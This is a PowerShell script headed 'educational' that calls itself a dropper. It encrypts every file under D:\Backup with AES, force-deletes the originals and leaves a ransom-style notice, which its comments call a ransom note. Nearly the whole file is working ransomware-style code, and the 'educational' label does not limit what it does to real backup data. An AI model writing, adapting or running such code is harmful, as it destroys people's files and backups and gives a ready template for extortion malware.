# EDUCATIONAL BACKUP FOLDER ENCRYPTOR - PowerShell
# Encrypts files in D:\Backup

Write-Host "========================================" -ForegroundColor Yellow
Write-Host "   BACKUP FOLDER ENCRYPTION DROPPER" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "Target: D:\Backup" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Yellow

# Generate encryption key
$aes = New-Object System.Security.Cryptography.AesManaged
$aes.GenerateKey()
$key = $aes.Key
$keyBase64 = [Convert]::ToBase64String($key)

Write-Host "[KEY] Encryption Key (save this!):" -ForegroundColor Magenta
Write-Host $keyBase64 -ForegroundColor White
Write-Host ""

# Target directory
$targetDir = "D:\Backup"
$extension = ".backup_locked"

# Create directory if it doesn't exist
if (-not (Test-Path $targetDir)) {
    Write-Host "[INFO] Creating target directory..." -ForegroundColor Yellow
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    
    # Create demo files
    $demoFiles = @{
        "important_backup.txt" = "This is important backup data"
        "family_photos.zip" = "Family photos archive"
        "work_documents.rar" = "Work documents"
        "financial_records.xlsx" = "Financial records"
    }
    
    foreach ($file in $demoFiles.GetEnumerator()) {
        $filePath = Join-Path $targetDir $file.Key
        $file.Value | Out-File -FilePath $filePath -Encoding UTF8
    }
    Write-Host "[INFO] Created demo files for testing" -ForegroundColor Green
}

Write-Host "[TARGET] Encrypting files in $targetDir" -ForegroundColor Cyan

$encryptedCount = 0
$failedCount = 0

# Get all files
$files = Get-ChildItem -Path $targetDir -File -Recurse | Where-Object {
    $_.Extension -ne $extension -and $_.Name -ne "BACKUP_ENCRYPTION_NOTICE.txt"
}

foreach ($file in $files) {
    try {
        Write-Host "[ENCRYPTING] $($file.Name)" -ForegroundColor Yellow
        
        $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)
        $aes.GenerateIV()
        $encryptor = $aes.CreateEncryptor()
        $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
        
        $newFileName = $file.FullName + $extension
        [System.IO.File]::WriteAllBytes($newFileName, $encryptedContent)
        Remove-Item $file.FullName -Force
        
        $encryptedCount++
        Write-Host "  -> Successfully encrypted" -ForegroundColor Green
        
    } catch {
        Write-Host "  -> Failed to encrypt: $($_.Exception.Message)" -ForegroundColor Red
        $failedCount++
    }
}

# Create ransom note
$noteContent = @"
================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted.

Target Directory: $targetDir
Files Encrypted: $encryptedCount
Extension Added: $extension

Save this key for decryption:
$keyBase64

Educational Purpose Only
================================
"@

$notePath = Join-Path $targetDir "BACKUP_ENCRYPTION_NOTICE.txt"
$noteContent | Out-File -FilePath $notePath -Encoding UTF8

Write-Host "[NOTE] Created encryption notice" -ForegroundColor Cyan
Write-Host "[COMPLETE] Encrypted $encryptedCount files, failed $failedCount files" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Yellow

Write-Host "`nPress any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
